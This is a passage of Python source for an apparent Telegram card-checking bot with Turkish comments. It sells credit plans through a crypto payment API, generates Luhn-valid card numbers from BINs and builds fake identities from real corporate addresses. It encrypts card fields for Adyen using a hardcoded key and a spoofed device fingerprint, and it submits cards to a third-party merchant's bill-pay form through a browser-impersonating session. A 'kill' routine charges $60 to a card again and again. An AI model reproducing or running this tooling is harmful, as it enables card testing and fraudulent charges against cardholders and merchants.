                    track_id = result.get('trackId')
                    pay_link = result.get('payLink')
                    address = result.get('payAddress', '')
                    
                    self.pending_payments[track_id] = {
                        'user_id': user_id,
                        'amount_usd': amount_usd,
                        'currency': currency,
                        'plan_name': plan_name,
                        'credit_amount': credit_amount,
                        'paid': False,
                        'pay_link': pay_link,
                        'address': address,
                        'expected_amount': result.get('payAmount', amount_usd)
                    }
                    
                    return {
                        'success': True,
                        'address': address if address else pay_link,
                        'amount': result.get('payAmount', amount_usd),
                        'currency': result.get('payCurrency', currency),
                        'network': result.get('network', network),
                        'track_id': track_id,
                        'order_id': order_id,
                        'qr_code': result.get('qrCode', ''),
                        'pay_link': pay_link
                    }
                else:
                    error_msg = result.get('message', 'Unknown error')
                    logger.error(f"OxaPay API error: {error_msg}")
                    return {'success': False, 'error': f"API Error: {error_msg}"}
            else:
                logger.error(f"OxaPay HTTP error: {response.status_code}")
                return {'success': False, 'error': f"HTTP Error: {response.status_code}"}
                
        except requests.exceptions.Timeout:
            logger.error("OxaPay timeout")
            return {'success': False, 'error': "Connection timeout"}
        except requests.exceptions.ConnectionError:
            logger.error("OxaPay connection error")
            return {'success': False, 'error': "Connection error"}
        except Exception as e:
            logger.error(f"OxaPay unexpected error: {e}")
            return {'success': False, 'error': f"System error: {str(e)}"}
    
    def check_payment(self, track_id):
        url = f"{self.base_url}/merchants/inquiry"
        payload = {"merchant": self.api_key, "trackId": track_id}
        
        try:
            response = requests.post(url, json=payload, timeout=30)
            result = response.json()
            
            payment_info = self.pending_payments.get(track_id, {})
            expected_amount = payment_info.get('expected_amount', 0)
            
            if result.get('status') == 'Paid' or result.get('result') == 100:
                paid_amount = float(result.get('payAmount', 0))
                
                if paid_amount >= expected_amount:
                    return {
                        'status': 'Completed', 
                        'result': 100, 
                        'paid_amount': paid_amount,
                        'expected_amount': expected_amount
                    }
                else:
                    return {
                        'status': 'Insufficient', 
                        'result': 104, 
                        'paid_amount': paid_amount,
                        'expected_amount': expected_amount
                    }
            elif result.get('status') == 'Expired':
                return {'status': 'Expired', 'result': 102}
            elif result.get('status') == 'Failed':
                return {'status': 'Failed', 'result': 103}
            else:
                return {'status': 'Waiting', 'result': 101}
        except:
            return {'status': 'Waiting', 'result': 101}

oxapay = OxaPayIntegration()

# ============================================================================
# ENCRYPTOR
# ============================================================================
class Encryptor:
    def __init__(self, adyen_public_key: str, adyen_version: str = '1', adyen_prefix: str = 'adyenjs'):
        self.adyen_public_key = adyen_public_key
        self.adyen_version = self._normalize_version(adyen_version)
        self.adyen_prefix = adyen_prefix

    def encrypt_field(self, name: str, value: str) -> str:
        payload = self._build_field_payload(name, value)
        return self._encrypt_payload(payload)

    def encrypt_card(self, card: any = None, cvv: any = None, month: any = None, year: any = None) -> dict[str, str]:
        field_definitions = (
            ('encryptedCardNumber', 'number', card),
            ('encryptedSecurityCode', 'cvc', cvv),
            ('encryptedExpiryMonth', 'expiryMonth', month),
            ('encryptedExpiryYear', 'expiryYear', year),
        )

        encrypted = {}
        for output_key, field_name, raw_value in field_definitions:
            if raw_value is None:
                continue
            value_str = str(raw_value).strip()
            if not value_str:
                continue
            encrypted[output_key] = self.encrypt_field(field_name, value_str)

        return encrypted

    def _encrypt_payload(self, payload: dict) -> str:
        if self._is_jwe_version():
            return self._encrypt_payload_jwe(payload)
        return self._encrypt_payload_legacy(payload)

    @staticmethod
    def _serialize_payload(payload: dict) -> str:
        return json.dumps(payload, sort_keys=True, separators=(',', ':'))

    @staticmethod
    def _build_field_payload(name: str, value: str) -> dict:
        generation_time = dt.now(pytz.timezone('UTC')).strftime('%Y-%m-%dT%H:%M:%S.000Z')
        return {name: value, 'generationtime': generation_time}

    def _encrypt_payload_legacy(self, payload: dict) -> str:
        payload_json = self._serialize_payload(payload)
        aes_key = self._generate_aes_key()
        nonce = self._generate_nonce()
        encrypted_payload = self._encrypt_with_aes_key(aes_key, nonce, payload_json.encode('utf-8'))
        encrypted_card_component = nonce + encrypted_payload

        public_key = self._decode_adyen_public_key(self.adyen_public_key)
        encrypted_aes_key = self._encrypt_with_public_key(public_key, aes_key)

        return "{}_{}${}${}".format(
            self.adyen_prefix,
            self.adyen_version,
            base64.standard_b64encode(encrypted_aes_key).decode(),
            base64.standard_b64encode(encrypted_card_component).decode(),
        )

    def _encrypt_payload_jwe(self, payload: dict) -> str:
        header = {'alg': 'RSA-OAEP', 'enc': 'A256GCM', 'version': self.adyen_version}
        header_json = self._serialize_payload(header)
        header_b64 = self._b64url_encode(header_json.encode('utf-8'))

        cek = AESGCM.generate_key(bit_length=256)
        public_key = self._decode_adyen_public_key(self.adyen_public_key)
        encrypted_key = public_key.encrypt(cek, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None))

        iv = os.urandom(12)
        aad = header_b64.encode('ascii')
        aesgcm = AESGCM(cek)
        ct_and_tag = aesgcm.encrypt(iv, self._serialize_payload(payload).encode('utf-8'), aad)
        ciphertext, tag = ct_and_tag[:-16], ct_and_tag[-16:]

        return '.'.join((header_b64, self._b64url_encode(encrypted_key), self._b64url_encode(iv), self._b64url_encode(ciphertext), self._b64url_encode(tag)))

    @staticmethod
    def _decode_adyen_public_key(encoded_public_key: str):
        backend = default_backend()
        key_components = encoded_public_key.split("|")
        public_number = rsa.RSAPublicNumbers(int(key_components[0], 16), int(key_components[1], 16))
        return public_number.public_key(backend)

    @staticmethod
    def _encrypt_with_public_key(public_key, plaintext: bytes) -> bytes:
        return public_key.encrypt(plaintext, padding.PKCS1v15())

    @staticmethod
    def _generate_aes_key() -> bytes:
        return AESCCM.generate_key(bit_length=256)

    @staticmethod
    def _encrypt_with_aes_key(aes_key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
        cipher = AESCCM(aes_key, tag_length=8)
        return cipher.encrypt(nonce, plaintext, None)

    @staticmethod
    def _generate_nonce() -> bytes:
        return os.urandom(12)

    @staticmethod
    def _normalize_version(version: str) -> str:
        version = version.strip()
        return version[1:] if version.startswith('_') else version

    def _is_jwe_version(self) -> bool:
        return not self.adyen_version.startswith('0_')

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


ADYEN_KEY = "10001|BA327E20BF4A7B6EFEBF38FF1B0A4E518FD5865B5A88C28852A802AF7812EB2939B04950F96DC7445FE20225A6DA973350BAEF080F5C172C48E9F317422055E9EC754A50D3F191A9CCE6ACEAEC45461C32F6938F8446425B9DD1E18FFBD4D111229B32E395CC3490346F77EADF53985670EAB74623ABBA5CC773371F90358B0D979563AA140DF9E3538F6E80CB9725203D8D0CDBFED5095A6282F1AB8B506B25067D9DB52BDEC18FC9539EED189569E6E46256926FA7AD84A6FDB7F9C9CB47B0ACD51D6D9A23ADF33446670F5CDD609D8008E6BFFA55172D6978976893C66395FBD91FCB1F656D67A3A794000E3F563218115B036B4F467D55A3D43B798D1ABD"
CLIENT_DATA = "eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IjFCMk0yWThBc2cwMDAwMDAwMDAwMDAwMDAweFpYZHVlSW94VzAwMDcxMDgwNTZjVkI5NGlLekJHRE9WM0RHbmxHUTFCMk0yWThBc2cwMDBKWUdOT0FEbFc0MDAwMDB1RmhKRTAwMDAwaE5wbGpoeDBFelJXVDFlYjg1R3U6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbIl9ycF91aWQ9MmNkN2JmYjAtOTA3Yi0wODk5LWQ3NTYtOTdlMzI3ODAzNGE2Il0sImNvbXBvbmVudHMiOnsidXNlckFnZW50IjoiZGE1OTcyYTM4NThlODQ3ZjU5MWYzNzA0OWMxZDVlNzIiLCJ3ZWJkcml2ZXIiOjAsImxhbmd1YWdlIjoidHIiLCJjb2xvckRlcHRoIjoyNCwiZGV2aWNlTWVtb3J5Ijo4LCJwaXhlbFJhdGlvIjoyLCJoYXJkd2FyZUNvbmN1cnJlbmN5Ijo4LCJzY3JlZW5XaWR0aCI6ODAwLCJzY3JlZW5IZWlnaHQiOjM2MCwiYXZhaWxhYmxlU2NyZWVuV2lkdGgiOjgwMCwiYXZhaWxhYmxlU2NyZWVuSGVpZ2h0IjozNjAsInRpbWV6b25lT2Zmc2V0IjotMTgwLCJ0aW1lem9uZSI6IkV1cm9wZS9Jc3RhbmJ1bCIsInNlc3Npb25TdG9yYWdlIjoxLCJsb2NhbFN0b3JhZ2UiOjEsImluZGV4ZWREYiI6MSwiYWRkQmVoYXZpb3IiOjAsIm9wZW5EYXRhYmFzZSI6MCwicGxhdGZvcm0iOiJMaW51eCBhcm12ODEiLCJwbHVnaW5zIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAiLCJjYW52YXMiOiJmMGRjOWVmOWM0NzNjZTEzODNmMjRlODAwZTViYmMwZiIsIndlYmdsIjoiZWYxZGE5OGZlZDZhYmVlNDg1NjAyY2M3NjQ5YjI5ZjAiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKEFSTSl+QU5HTEUgKEFSTSwgTWFsaS1HNTIgTUMyLCBPcGVuR0wgRVMgMy4yKSIsImFkQmxvY2siOjAsImhhc0xpZWRMYW5ndWFuZXMiOjAsImhhc0xpZWRSZXNvbHV0aW9uIjowLCJoYXNMaWVkT3MiOjAsImhhc0xpZWRCcm93c2VyIjowLCJmb250cyI6IjM4NzRmNjdiYWM1ZWU1M2I3YTliN2FjZTg5MDBlY2FjIiwiYXVkaW8iOiJiMDU2NTY4Yjc4YjliMzQ3M2RlNjUyOTM2NzNkYmVmOSIsImVudW1lcmF0ZURldmljZXMiOiI1ZjNmZGFmNDc0M2VhYTcwN2NhNmI3ZGE2NTYwMzg5MiIsInZpc2l0ZWRQYWdlcyI6W10sImJhdHRlcnlJbmZvIjp7ImJhdHRlcnlMZXZlbCI6OTcsImJhdHRlcnlDaGFyZ2luZyI6ZmFsc2V9LCJib3REZXRlY3RvcnMiOnsid2ViRHJpdmVyIjpmYWxzZSwiY29va2llRW5hYmxlZCI6dHJ1ZSwiaGVhZGxlc3NCcm93c2VyIjpmYWxzZSwibm9MYW5ndWFuZXMiOmZhbHNlLCJpbmNvbnNpc3RlbnRFdmFsIjpmYWxzZSwiaW5jb25zaXN0ZW50UGVybWlzc2lvbnMiOmZhbHNlLCJkb21NYW5pcHVsYXRpb24iOmZhbHNlLCJhcHBWZXJzaW9uU3VzcGljaW91cyI6ZmFsc2UsImZ1bmN0aW9uQmluZFN1c3BpY2lvdXMiOnRydWUsImJvdEluVXNlckFnZW50IjpmYWxzZSwid2luZG93U2l6ZVN1c3BpY2lvdXMiOmZhbHNlLCJib3RJbldpbmRvd0V4dGVybmFsIjpmYWxzZX19"

# ============================================================================
# YARDIMCI FONKSİYONLAR
# ============================================================================
def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def generate_random_password():
    return "Pass" + ''.join(random.choices(string.digits, k=6))


class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        if re.match(r'^6(?:011|5)', first6) or re.match(r'^622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[01][0-9]|92[0-5])', first6): return 'discover'
        if re.match(r'^3(?:0[0-5]|[68])', first6): return 'diners'
        if re.match(r'^35(?:2[89]|[3-8][0-9])', first6): return 'jcb'
        return 'unknown'

    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    @staticmethod
    def generate_luhn_check_digit(card_number: str) -> int:
        for i in range(10):
            if CardGenerator.luhn_checksum(card_number + str(i)) == 0:
                return i
        return 0

    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4:
            return None
        bin_pattern, month_pattern, year_pattern, cvv_pattern = bin_number, None, None, None
        if '|' in bin_number:
            parts = bin_number.split('|')
            bin_pattern = parts[0]
            month_pattern = parts[1] if len(parts) > 1 else None
            year_pattern = parts[2] if len(parts) > 2 else None
            cvv_pattern = parts[3] if len(parts) > 3 else None

        bin_pattern = re.sub(r'[^0-9xX]', '', bin_pattern)
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3

        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining):
            card += str(random.randint(0, 9))
        check_digit = CardGenerator.generate_luhn_check_digit(card)
        full_card = card + str(check_digit)

        if month_pattern:
            month = month_pattern.zfill(2) if month_pattern.lower() != 'xx' else f"{random.randint(1,12):02d}"
        else:
            future_month = datetime.now().month + random.randint(1, 36)
            month = f"{((future_month-1)%12)+1:02d}"

        if year_pattern:
            year = year_pattern.zfill(2) if year_pattern.lower() != 'xx' else f"{datetime.now().year + random.randint(1,8):02d}"
        else:
            year = f"{datetime.now().year + random.randint(1,5):02d}"

        if cvv_pattern:
            if cvv_pattern.lower() in ('xxx','xxxx'):
                cvv = ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
            else:
                cvv = cvv_pattern.zfill(cvv_len)
        else:
            cvv = ''.join(str(random.randint(0,9)) for _ in range(cvv_len))

        return {
            'card': full_card,
            'month': month,
            'year': year,
            'cvv': cvv,
            'brand': brand.upper()
        }

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

def animated_print(text, color='\033[96m', delay=0.03):
    RESET = '\033[0m'
    for char in text:
        print(f"{color}{char}{RESET}", end='', flush=True)
        time.sleep(delay)
    print()

def loading_animation(duration=2):
    animation = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    for i in range(duration * 10):
        print(f"\r{YELLOW}{animation[i % len(animation)]} Processing...{RESET}", end="", flush=True)
        time.sleep(0.1)
    print()

# ============================================================================
# HATA MESAJI SANSÜRLEME VE DÜZENLEME
# ============================================================================
def format_response(result, gateway_type=None):
    """API yanıtlarını düzenler - Asla None döndürmez"""
    if result is None:
        return "Your card was declined"
    
    if not isinstance(result, str):
        return "Your card was declined"
    
    result_lower = result.lower()
    
    adyen_based_gates = ['adyen', 'braintree', 'shopify', 'paypal', 'b1', 'sh', 'pp', 'ad', 'adyenvbv']
    
    if "incorrect_cvc" in result_lower or "security code" in result_lower or ("cvc" in result_lower and ("invalid" in result_lower or "incorrect" in result_lower)):
        return "Your card's security code is incorrect"
    
    if "insufficient" in result_lower or "low funds" in result_lower or "insufficient funds" in result_lower:
        return "Insufficient funds"
    
    if "charged" in result_lower:
        return "CHARGED"
    if "approved" in result_lower or "live" in result_lower:
        return "LIVE"
    if "3ds" in result_lower or "3d secure" in result_lower or "requires_action" in result_lower:
        return "3DS Required"
    
    if gateway_type:
        if any(g in gateway_type.lower() for g in adyen_based_gates):
            if "api error" in result_lower or "system error" in result_lower or "gateway error" in result_lower:
                return "Your card was declined"
            if "declined" in result_lower:
                return "Your card was declined"
            return result
        else:
            return result
    
    if "declined" in result_lower:
        return "Your card was declined"
    
    return result

def censor_error_message(error_msg):
    if error_msg is None:
        return "Your card was declined"
    if not isinstance(error_msg, str):
        return "Your card was declined"
    if "API Error" in error_msg or "System Error" in error_msg or "Gateway Error" in error_msg:
        return "Your card was declined"
    error_msg = re.sub(r'https?://[^\s]+', '[URL HIDDEN]', error_msg)
    error_msg = re.sub(r'\d+\.\d+\.\d+\.\d+', '[IP HIDDEN]', error_msg)
    error_msg = re.sub(r'api\.[^\s]+', '[API HIDDEN]', error_msg)
    error_msg = re.sub(r'[a-zA-Z0-9]+\.yousician\.com', '[DOMAIN HIDDEN]', error_msg)
    error_msg = re.sub(r'PP_[A-Z0-9]+-[a-z]+:[a-z0-9]+@[^\s]+', '[PROXY HIDDEN]', error_msg)
    error_msg = re.sub(r'pk_live_[A-Za-z0-9]+', '[KEY HIDDEN]', error_msg)
    error_msg = re.sub(r'acct_[A-Za-z0-9]+', '[ACCT HIDDEN]', error_msg)
    return error_msg

# ============================================================================
# BIN DATA
# ============================================================================
def load_bin_data():
    try:
        with open('bin-list-data.csv', 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) >= 8:
                    bin_code = row[0].strip()
                    BIN_DATA[bin_code[:6]] = {
                        'scheme': row[1] if len(row) > 1 else 'UNKNOWN',
                        'type': row[2] if len(row) > 2 else 'UNKNOWN',
                        'brand': row[3] if len(row) > 3 else 'UNKNOWN',
                        'bank': row[4].replace('"', '').strip() if len(row) > 4 else 'UNKNOWN',
                        'country': row[7] if len(row) > 7 else 'UNKNOWN'
                    }
        logger.info(f"✅ {len(BIN_DATA)} BIN records loaded")
    except FileNotFoundError:
        logger.warning("⚠️ bin-list-data.csv not found!")

def get_bin_info(bin_code):
    bin_code = bin_code[:6]
    
    cache_key = f"bin:{bin_code}"
    cached = cache.get(cache_key)
    if cached:
        return cached
    
    if bin_code in BIN_DATA:
        data = BIN_DATA[bin_code]
        info = {
            'scheme': data['scheme'].upper(),
            'type': data['type'].upper(),
            'brand': data['brand'].upper(),
            'bank': data['bank'].upper(),
            'country': data['country'].upper()
        }
        cache.set(cache_key, info, 3600)
        return info
        
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            info = {
                'scheme': data.get('scheme', 'UNKNOWN').upper(),
                'type': data.get('type', 'UNKNOWN').upper(),
                'brand': data.get('brand', 'UNKNOWN').upper(),
                'bank': data.get('bank', {}).get('name', 'UNKNOWN').upper(),
                'country': data.get('country', {}).get('name', 'UNKNOWN').upper()
            }
            cache.set(cache_key, info, 3600)
            return info
    except:
        pass
    return None

# ============================================================================
# KANAL KONTROLÜ
# ============================================================================
def check_membership(user_id):
    return True

def get_channels_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for channel in REQUIRED_CHANNELS:
        btn = types.InlineKeyboardButton(f"Join {channel['name']}", url=channel['link'])
        markup.add(btn)
    btn_check = types.InlineKeyboardButton("Check Membership", callback_data="check_membership")
    markup.add(btn_check)
    return markup

# ============================================================================
# REAL GENERATOR
# ============================================================================
class RealGenerator:
    def __init__(self):
        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua", "Kevin", "Brian", "George", "Edward", "Ronald", "Timothy", "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon", "Benjamin", "Samuel", "Gregory", "Frank", "Alexander", "Raymond", "Patrick", "Jack", "Dennis", "Jerry"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts"]
        self.addresses = [
            {"street": "1600 Amphitheatre Pkwy", "city": "Mountain View", "state": "CA", "zip": "94043"},
            {"street": "1 Infinite Loop", "city": "Cupertino", "state": "CA", "zip": "95014"},
            {"street": "350 5th Ave", "city": "New York", "state": "NY", "zip": "10118"},
            {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
            {"street": "1111 S Figueroa St", "city": "Los Angeles", "state": "CA", "zip": "90015"},
            {"street": "20 W 34th St", "city": "New York", "state": "NY", "zip": "10001"},
            {"street": "100 Universal City Plaza", "city": "Universal City", "state": "CA", "zip": "91608"},
            {"street": "2000 Gene Autry Way", "city": "Anaheim", "state": "CA", "zip": "92806"},
            {"street": "1000 Elysian Park Ave", "city": "Los Angeles", "state": "CA", "zip": "90012"},
            {"street": "1 Washington Sq", "city": "San Jose", "state": "CA", "zip": "95192"},
            {"street": "1501 4th Ave", "city": "Seattle", "state": "WA", "zip": "98101"},
            {"street": "400 Broad St", "city": "Seattle", "state": "WA", "zip": "98109"},
            {"street": "10001 Woodloch Forest Dr", "city": "The Woodlands", "state": "TX", "zip": "77380"},
            {"street": "201 E Randolph St", "city": "Chicago", "state": "IL", "zip": "60601"},
            {"street": "1000 NC Music Factory Blvd", "city": "Charlotte", "state": "NC", "zip": "28206"}
        ]
        
    def get_identity(self):
        first = random.choice(self.first_names)
        last = random.choice(self.last_names)
        addr = random.choice(self.addresses)
        domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"])
        email = f"{first.lower()}.{last.lower()}{random.randint(100, 999)}@{domain}"
        phone = f"+1-{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
        return {
            "first_name": first,
            "last_name": last,
            "email": email,
            "phone": phone,
            "address": addr["street"],
            "city": addr["city"],
            "state": addr["state"],
            "zip": addr["zip"],
            "country": "US"
        }


class DeluxeGateway:
    def __init__(self, proxy=None):
        self.session = curl_requests.Session(impersonate="chrome120")
        self.form_id = "603d1196-dd24-96d9-210e-a03e00a9b038"
        self.base_url = "https://of.deluxe.com/gateway/api"
        self.form_unique_id = None
        self.cc_input = None
        self.cvv_input = None
        self.ip_address = "127.0.0.1"

        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
            self.session.verify = False

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://of.deluxe.com',
            'Referer': f'https://of.deluxe.com/gateway/publish/{self.form_id}',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        })

    def visit_page(self):
        url = f"https://of.deluxe.com/gateway/publish/{self.form_id}"
        r = self.session.get(url)

    def get_form(self):
        url = f"{self.base_url}/Published/Post"
        payload = f'query{{getPublishedFormIdAsync(formId:"{self.form_id}",ipAddress:"{self.ip_address}"){{status,data,successMessage,errorMessage}}}}'
        r = self.session.post(url, data=json.dumps(payload))
        text = r.text

        m = re.search(r'formUniqueId[\\"]+"?:?[\\"]+"?([a-f0-9-]{36})', text)
        if m:
            self.form_unique_id = m.group(1)

        m = re.search(r'ccInput[\\"]+"?:?[\\"]+"?([a-zA-Z0-9]+)', text)
        if m:
            self.cc_input = m.group(1)

        m = re.search(r'cvvInput[\\"]+"?:?[\\"]+"?([a-zA-Z0-9]+)', text)
        if m:
            self.cvv_input = m.group(1)

        m = re.search(r'ipAddress[\\"]+"?:?[\\"]+"?([0-9.]+)', text)
        if m:
            self.ip_address = m.group(1)

    def register_form_unique_id(self):
        url = f"{self.base_url}/Published/Post"
        inner_data = json.dumps({"uniqueId": self.form_unique_id, "formId": self.form_id, "mode": "insert"})
        escaped = json.dumps(inner_data)[1:-1] 
        mutation = f'mutation{{graphQLRequest(requestName:"FormUniqueId_Insert_Update_V1",requestData:"{escaped}"){{status,data,successMessage,errorMessage}}}}'
        r = self.session.post(url, data=json.dumps(mutation))

    def ip_check(self):
        url = f"{self.base_url}/Published/Post"
        payload = f'mutation{{graphQLRequest(requestName:"IPBlackListAction",requestData:"[{{\\"Action\\":\\"ipaddressvalidation\\",\\"IPAddress\\":\\"{{{{ipAddress}}}}\\",\\"FormURL\\":\\"{self.form_id}\\"}}]"){{status,data,successMessage,errorMessage}}}}'
        r = self.session.post(url, data=json.dumps(payload))

    def get_postback(self):
        url = f"{self.base_url}/Form/GetPostBackURL"
        inner = json.dumps({"formId": self.form_id, "isTemplate": False})
        r = self.session.post(url, json=inner)

    def get_payment_config(self):
        url = f"{self.base_url}/Published/Post"
        payload = f'query{{getPaymentResponse(formId:"{self.form_id}"){{approvalAmount,approvalCode,approvalFooter,approvalHeader,declineFooter,declineCode,declineHeader,formId,rawJson,recurringFooter,recurringHeader,rejectJson}}}}'
        r = self.session.post(url, data=json.dumps(payload))

    def get_auth_base(self):
        url = f"{self.base_url}/Published/Post"
        payload = f'query{{getAuthorizedRequestBase(type:"Credit Card",formId:"{self.form_id}",accessToken:"")}}'
        r = self.session.post(url, data=json.dumps(payload))

        m = re.search(r'VersionNum[\\"]+"?:?[\\"]?"?(\d+)', r.text)
        self.version_num = int(m.group(1)) if m else 123

        m = re.search(r'ApplicationId[\\"]+"?:?[\\"]?"?([a-f0-9-]{36})', r.text)
        self.application_id = m.group(1) if m else "7c9e6679-7425-40de-944b-e07fc1f90ae7"

    def submit(self, cc, mm_yy, cvv, amount="1.00"):
        url = f"{self.base_url}/Form/SubmitPayment"

        if not self.form_unique_id:
            return "DECLINED - card declined"   # None döndürme!

        ident = RealGenerator().get_identity()

        payload = {
            "IpAddress": "{{ipAddress}}",
            "VersionNum": self.version_num,
            "ApplicationId": self.application_id,
            "RequestType": "Sale",
            "TransactionSource": "PAYMENT PAGE BUILDER",
            "AccessToken": "{{AccessToken}}",
            "Industry": "Ecommerce",
            "RequestId": str(uuid.uuid4()),
            "FormUniqueId": self.form_unique_id,
            "IsSavePaymentOption": False,
            "Amount": {
                "Amount": amount,
                "Currency": "1",
                "FeeCovered": 0,
                "FeePercent": "3.00"
            },
            "PaymentMethod": {
                "CreditCard": {
                    "CcNumber": cc,
                    "ExpMonthYear": mm_yy,
                    "CVV2": cvv
                },
                "BillingAddress": {
                    "Title": "",
                    "FirstName": ident["first_name"],
                    "LastName": ident["last_name"],
                    "Address": ident["address"],
                    "Address2": "",
                    "City": ident["city"],
                    "State": ident["state"],
                    "PostalCode": ident["zip"],
                    "Country": ident["country"],
                    "Telephone": ident["phone"],
                    "EmailAddress": ident["email"],
                    "CompanyName": "",
                    "FaxNumber": ""
                }
            },
            "ShippingAddress": None,
            "Level2Data": {
                "CustomerRefNo": "",
                "ShippingZip": "",
                "TaxAmount": 0,
                "PurchaseCard": False,
                "LocalTaxFlag": 0,
                "Level2TaxAmount": 0,
                "IsLevel2Enabled": False
            },
            "Level3Data": [],
            "ReccuringData": None,
            "OrderData": {
                "AutoGenerateOrderId": True,
                "OrderId": None,
                "OrderIdIsUnique": False
            },
            "CustomData": [
                {"CustomDataName": "FormId", "CustomDataValue": self.form_id},
                {"CustomDataName": "FormTitle", "CustomDataValue": "Bill Pay Form FINAL"},
                {"CustomDataName": "CustomerFirstName", "CustomDataValue": ident["first_name"]},
                {"CustomDataName": "CustomerLastName", "CustomDataValue": ident["last_name"]},
                {"CustomDataName": "SubmissionMethod", "CustomDataValue": "Online Form (Bill Pay Form FINAL)"}
            ],
            "Fee": None
        }

        payload_str = json.dumps(payload)
        r = self.session.post(url, json=payload_str)
        text = r.text

        try:
            data = json.loads(text)
            if isinstance(data, str):
                data = json.loads(data)
                
            acct_data = data.get("AccountResponseData")
            cvv_result = acct_data.get('CVV2', '') if acct_data else ''
            avs_result = acct_data.get('AVS', '') if acct_data else ''
            
            resp_code = str(data.get("ResponseCode", ""))
            
            if resp_code == "0":
                amount_display = f"${amount}" if '.' in amount else f"{amount}.00"
                return f"CHARGED - {amount_display}"
            else:
                errors = data.get("Errors", [])
                err_str = " / ".join(errors) if errors else "Unknown error"
                return f"DECLINED - {err_str}"
                
        except json.JSONDecodeError:
            return "DECLINED - Invalid response"
        except Exception as e:
            return f"DECLINED - {str(e)}"

def deluxe_charge(card, amount):
    try:
        if "|" not in card:
            return "DECLINED - Invalid format"
        
        parts = card.split("|")
        if len(parts) < 4:
            return "DECLINED - Invalid card format"
            
        cc = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvv = parts[3]
        
        mm_yy = f"{mm}/{yy[-2:]}"
        
        if isinstance(amount, float) or (isinstance(amount, str) and '.' in amount):
            amount_str = f"{float(amount):.2f}"
        else:
            amount_str = f"{int(amount)}.00"
        
        proxy_url = "" 
        gw = DeluxeGateway(proxy=proxy_url)
        
        gw.visit_page()
        gw.get_form()
        gw.register_form_unique_id()
        gw.ip_check()
        gw.get_postback()
        gw.get_payment_config()
        gw.get_auth_base()
        
        result = gw.submit(cc, mm_yy, cvv, amount_str)
        
        if result is None:
            return "DECLINED - Gateway timed out"
            
        return result
        
    except IndexError:
        return "DECLINED - Invalid card format (missing fields)"
    except Exception as e:
        return "DECLINED - System error"

# ============================================================================
# KILL FONKSİYONU
# ============================================================================
def kill_charge(card):
    results = []
    
    for i in range(3):
        result = deluxe_charge(card, 60)
        results.append(f"Attempt {i+1}: {result}")
        time.sleep(2)
    
